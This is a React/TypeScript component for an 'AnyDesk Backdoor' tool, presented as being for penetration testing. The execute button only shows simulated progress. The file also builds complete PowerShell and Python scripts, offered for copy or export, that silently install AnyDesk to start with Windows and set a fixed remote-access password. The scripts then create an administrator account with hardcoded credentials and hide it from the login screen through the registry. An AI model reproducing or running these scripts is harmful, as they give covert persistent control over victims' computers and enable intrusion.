'use client';

import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card';
import { Progress } from '@/components/ui/progress';
import { Terminal } from '@/components/ui/terminal';
import {
    AlertTriangle,
    CheckCircle,
    Download,
    Monitor,
    Play,
    Settings,
    Square,
    XCircle
} from 'lucide-react';
import { useState } from 'react';

interface AnyDeskConfig {
  installPath: string;
  anydeskUrl: string;
  password: string;
  adminUsername: string;
  adminPassword: string;
}

interface ExecutionResult {
  success: boolean;
  message: string;
  anydeskId?: string;
  error?: string;
}

export function AnyDeskBackdoor() {
  const [isExecuting, setIsExecuting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [results, setResults] = useState<ExecutionResult | null>(null);
  const [scriptType, setScriptType] = useState<'powershell' | 'python'>('powershell');
  const [config, setConfig] = useState<AnyDeskConfig>({
    installPath: 'C:\\ProgramData\\AnyDesk',
    anydeskUrl: 'http://download.anydesk.com/AnyDesk.exe',
    password: 'J9kzQ2Y0qO',
    adminUsername: 'oldadministrator',
    adminPassword: 'jsbehsid#Zyw4E3'
  });

  const handleExecute = async () => {
    setIsExecuting(true);
    setProgress(0);
    setResults(null);

    try {
      // Simulate execution progress
      const progressSteps = [
        { step: 'Validating configuration...', progress: 10 },
        { step: 'Downloading AnyDesk...', progress: 25 },
        { step: 'Installing AnyDesk...', progress: 40 },
        { step: 'Setting password...', progress: 55 },
        { step: 'Creating admin user...', progress: 70 },
        { step: 'Configuring permissions...', progress: 85 },
        { step: 'Retrieving AnyDesk ID...', progress: 95 },
        { step: 'Finalizing installation...', progress: 100 }
      ];

      for (const { progress } of progressSteps) {
        setProgress(progress);
        await new Promise(resolve => setTimeout(resolve, 800));
      }

      // Mock execution result
      const mockResult: ExecutionResult = {
        success: true,
        message: 'AnyDesk backdoor installed successfully',
        anydeskId: '123 456 789'
      };

      setResults(mockResult);
    } catch (error) {
      console.error('Execution failed:', error);
      setResults({
        success: false,
        message: 'Installation failed',
        error: error instanceof Error ? error.message : 'Unknown error occurred'
      });
    } finally {
      setIsExecuting(false);
      setProgress(0);
    }
  };

  const handleStop = () => {
    setIsExecuting(false);
    setProgress(0);
  };

  const copyScript = () => {
    const script = scriptType === 'powershell' 
      ? generatePowerShellScript()
      : generatePythonScript();
    
    navigator.clipboard.writeText(script);
  };

  const generatePowerShellScript = () => {
    return `function Install-AnyDesk {
    param (
        [string]$InstallPath = "${config.installPath}",
        [string]$AnyDeskUrl = "${config.anydeskUrl}",
        [string]$Password = "${config.password}",
        [string]$AdminUsername = "${config.adminUsername}",
        [string]$AdminPassword = "${config.adminPassword}"
    )

    try {
        if (-not (Test-Path -Path $InstallPath -PathType Container)) {
            New-Item -Path $InstallPath -ItemType Directory
        }

        Invoke-WebRequest -Uri $AnyDeskUrl -OutFile (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe")
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--install $InstallPath --start-with-win --silent" -Wait
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--set-password=$Password" -Wait
        New-LocalUser -Name $AdminUsername -Password (ConvertTo-SecureString -String $AdminPassword -AsPlainText -Force)
        Add-LocalGroupMember -Group "Administrators" -Member $AdminUsername
        Set-ItemProperty -Path "HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist" -Name $AdminUsername -Value 0 -Type DWORD -Force
        Start-Process -FilePath (Join-Path -Path $InstallPath -ChildPath "AnyDesk.exe") -ArgumentList "--get-id" -Wait
        
        Write-Host "Installation completed successfully."
    }
    catch {
        Write-Host "Error: $_"
        Write-Host "Installation failed."
    }
}

Install-AnyDesk`;
  };

  const generatePythonScript = () => {
    return `import os
import subprocess
import requests
import ctypes
import sys
import winreg

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def install_anydesk(install_path="${config.installPath.replace('\\', '\\\\')}",
                   anydesk_url="${config.anydeskUrl}",
                   password="${config.password}",
                   admin_username="${config.adminUsername}",
                   admin_password="${config.adminPassword}"):
    try:
        if is_admin():
            if not os.path.exists(install_path):
                os.makedirs(install_path)

            anydesk_exe_path = os.path.join(install_path, "AnyDesk.exe")
            with open(anydesk_exe_path, 'wb') as exe_file:
                response = requests.get(anydesk_url)
                exe_file.write(response.content)

            install_command = f'"{anydesk_exe_path}" --install "{install_path}" --start-with-win --silent'
            subprocess.run(install_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            set_password_command = f'"{anydesk_exe_path}" --set-password={password}'
            subprocess.run(set_password_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            subprocess.run(['net', 'user', admin_username, admin_password, '/add'], check=True)
            subprocess.run(['net', 'localgroup', 'Administrators', admin_username, '/add'], check=True)

            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r'Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\Userlist')
            winreg.SetValueEx(key, admin_username, 0, winreg.REG_DWORD, 0)
            winreg.CloseKey(key)

            get_id_command = f'"{anydesk_exe_path}" --get-id'
            subprocess.run(get_id_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

            print("Installation completed successfully.")
        else:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)

    except Exception as e:
        print(f"Error: {e}")
        print("Installation failed.")

install_anydesk()`;
  };

  const exportScript = () => {
    const script = scriptType === 'powershell' 
      ? generatePowerShellScript()
      : generatePythonScript();
    
    const filename = scriptType === 'powershell' 
      ? 'anydesk-backdoor.ps1'
      : 'anydesk-backdoor.py';
    
    const blob = new Blob([script], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="space-y-6">
      {/* Tool Header */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Monitor className="h-5 w-5 text-blue-400" />
            <span>AnyDesk Backdoor</span>
          </CardTitle>
          <CardDescription>
            Remote desktop backdoor tool for penetration testing and security assessment
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="flex items-center space-x-2">
            <Badge variant="outline" className="border-blue-600 text-blue-400">
              Windows Only
            </Badge>
            <Badge variant="outline" className="border-red-600 text-red-400">
              Admin Required
            </Badge>
            <Badge variant="outline" className="border-purple-600 text-purple-400">
              Stealth Mode
            </Badge>
          </div>
        </CardContent>
      </Card>

      {/* Configuration */}
      <Card>
        <CardHeader>
          <CardTitle className="flex items-center space-x-2">
            <Settings className="h-5 w-5" />
            <span>Configuration</span>
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="grid gap-4 md:grid-cols-2">
            <div className="space-y-2">
              <label htmlFor="script-type" className="text-sm font-medium">
                Script Type
              </label>
              <select
                id="script-type"
                value={scriptType}
                onChange={(e) => setScriptType(e.target.value as 'powershell' | 'python')}
                className="w-full px-3 py-2 border border-input rounded-md bg-background"
                disabled={isExecuting}
                aria-label="Select script type for AnyDesk backdoor installation"
              >
                <option value="powershell">PowerShell</option>
                <option value="python">Python</option>
              </select>
            </div>
            <div className="space-y-2">
              <label htmlFor="install-path" className="text-sm font-medium">
                Installation Path
              </label>
              <input
                id="install-path"
                type="text"
                value={config.installPath}
                onChange={(e) => setConfig({...config, installPath: e.target.value})}
                className="w-full px-3 py-2 border border-input rounded-md bg-background"
                disabled={isExecuting}
                aria-label="Installation path for AnyDesk backdoor"
                placeholder="C:\ProgramData\AnyDesk"
              />
            </div>
            <div className="space-y-2">
              <label htmlFor="anydesk-url" className="text-sm font-medium">
                AnyDesk URL
              </label>
              <input
                id="anydesk-url"
                type="text"
                value={config.anydeskUrl}
                onChange={(e) => setConfig({...config, anydeskUrl: e.target.value})}
                className="w-full px-3 py-2 border border-input rounded-md bg-background"
                disabled={isExecuting}
                aria-label="Download URL for AnyDesk executable"
                placeholder="http://download.anydesk.com/AnyDesk.exe"
              />
            </div>
            <div className="space-y-2">
              <label htmlFor="anydesk-password" className="text-sm font-medium">
                AnyDesk Password
              </label>
              <input
                id="anydesk-password"
                type="password"
                value={config.password}
                onChange={(e) => setConfig({...config, password: e.target.value})}
                className="w-full px-3 py-2 border border-input rounded-md bg-background"
                disabled={isExecuting}
                aria-label="Password for AnyDesk remote connection"
                placeholder="Enter connection password"
              />
            </div>
            <div className="space-y-2">
              <label htmlFor="admin-username" className="text-sm font-medium">
                Admin Username
              </label>
              <input
                id="admin-username"
                type="text"
                value={config.adminUsername}
                onChange={(e) => setConfig({...config, adminUsername: e.target.value})}
                className="w-full px-3 py-2 border border-input rounded-md bg-background"
                disabled={isExecuting}
                aria-label="Username for hidden administrative account"
                placeholder="Enter admin username"
              />
            </div>
            <div className="space-y-2">
              <label htmlFor="admin-password" className="text-sm font-medium">
                Admin Password
              </label>
              <input
                id="admin-password"
                type="password"
                value={config.adminPassword}
                onChange={(e) => setConfig({...config, adminPassword: e.target.value})}
                className="w-full px-3 py-2 border border-input rounded-md bg-background"
                disabled={isExecuting}
                aria-label="Password for hidden administrative account"
                placeholder="Enter admin password"
              />
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Execution Controls */}
      <Card>
        <CardHeader>
          <CardTitle>Execution Controls</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="flex items-center space-x-2">
            <Button
              onClick={handleExecute}
              disabled={isExecuting}
              className="bg-blue-600 hover:bg-blue-700"
              aria-label="Install AnyDesk backdoor with current configuration"
            >
              <Play className="mr-2 h-4 w-4" />
              {isExecuting ? 'Installing...' : 'Install Backdoor'}
            </Button>
            <Button
              onClick={handleStop}
              disabled={!isExecuting}
              variant="destructive"
              aria-label="Stop the current AnyDesk installation process"
            >
              <Square className="mr-2 h-4 w-4" />
              Stop
            </Button>
            <Button
              onClick={copyScript}
              disabled={isExecuting}
              variant="outline"
              aria-label="Copy generated script to clipboard"
            >
              Copy Script
            </Button>
            <Button
              onClick={exportScript}
              disabled={isExecuting}
              variant="outline"
              aria-label="Export generated script as a file"
            >
              <Download className="mr-2 h-4 w-4" />
              Export Script
            </Button>
          </div>

          {isExecuting && (
            <div className="mt-4 space-y-2">
              <div className="flex justify-between text-sm">
                <span>Installation Progress</span>
                <span>{progress}%</span>
              </div>
              <Progress value={progress} className="h-2" />
            </div>
          )}
        </CardContent>
      </Card>

      {/* Results */}
      {results && (
        <Card>
          <CardHeader>
            <CardTitle className="flex items-center justify-between">
              <span className="flex items-center space-x-2">
                {results.success ? (
                  <CheckCircle className="h-5 w-5 text-green-400" />
                ) : (
                  <XCircle className="h-5 w-5 text-red-400" />
                )}
                <span>Installation Results</span>
              </span>
              <Badge variant={results.success ? 'success' : 'destructive'}>
                {results.success ? 'Success' : 'Failed'}
              </Badge>
            </CardTitle>
          </CardHeader>
          <CardContent>
            {results.success ? (
              <div className="space-y-4">
                <div className="p-4 bg-green-50 dark:bg-green-950 rounded-lg">
                  <p className="text-sm font-medium text-green-800 dark:text-green-200">
                    {results.message}
                  </p>
                </div>
                
                {results.anydeskId && (
                  <div className="grid gap-4 md:grid-cols-2 text-sm">
                    <div>
                      <span className="text-muted-foreground">AnyDesk ID:</span>
                      <span className="ml-2 font-mono font-medium text-blue-400">
                        {results.anydeskId}
                      </span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">Connection Password:</span>
                      <span className="ml-2 font-mono font-medium text-yellow-400">
                        {config.password}
                      </span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">Admin Username:</span>
                      <span className="ml-2 font-medium">{config.adminUsername}</span>
                    </div>
                    <div>
                      <span className="text-muted-foreground">Admin Password:</span>
                      <span className="ml-2 font-mono font-medium text-red-400">
                        {config.adminPassword}
                      </span>
                    </div>
                  </div>
                )}

                <div className="p-4 bg-yellow-50 dark:bg-yellow-950 rounded-lg">
                  <p className="text-xs text-yellow-800 dark:text-yellow-200">
                    <strong>Security Note:</strong> This tool creates a hidden administrative user and installs AnyDesk for remote access. 
                    Use only for authorized penetration testing and security assessment purposes.
                  </p>
                </div>
              </div>
            ) : (
              <div className="flex items-center space-x-2 text-destructive">
                <AlertTriangle className="h-5 w-5" />
                <span>{results.error || results.message}</span>
              </div>
            )}
          </CardContent>
        </Card>
      )}

      {/* Script Preview */}
      <Card>
        <CardHeader>
          <CardTitle>Generated Script ({scriptType === 'powershell' ? 'PowerShell' : 'Python'})</CardTitle>
          <CardDescription>
            The script that will be executed on the target system
          </CardDescription>
        </CardHeader>
        <CardContent>
          <div className="bg-muted rounded-lg p-4">
            <pre className="text-xs font-mono whitespace-pre-wrap break-all max-h-96 overflow-y-auto">
              {scriptType === 'powershell' ? generatePowerShellScript() : generatePythonScript()}
            </pre>
          </div>
        </CardContent>
      </Card>

      {/* Terminal Output */}
      <Card>
        <CardHeader>
          <CardTitle>Execution Terminal</CardTitle>
          <CardDescription>
            Real-time execution output and debugging information
          </CardDescription>
        </CardHeader>
        <CardContent>
          <Terminal readOnly />
        </CardContent>
      </Card>
    </div>
  );
}
